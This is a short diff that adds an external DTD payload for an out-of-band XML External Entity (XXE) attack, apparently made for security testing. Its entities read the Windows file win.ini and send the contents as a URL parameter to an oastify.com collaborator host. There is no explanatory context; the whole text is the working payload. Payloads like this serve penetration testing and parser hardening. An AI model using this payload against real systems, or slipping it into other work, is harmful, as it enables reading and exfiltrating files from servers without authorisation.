@@ -1,0 +1,3 @@
+<!ENTITY % file SYSTEM "file:///c:/windows/win.ini">
+<!ENTITY % all "<!ENTITY xxecjy4p SYSTEM 'http://if14dt39lm6cgwcb8bw31fpi99f03vrk.oastify.com/?x=%file;'>">
+%all;
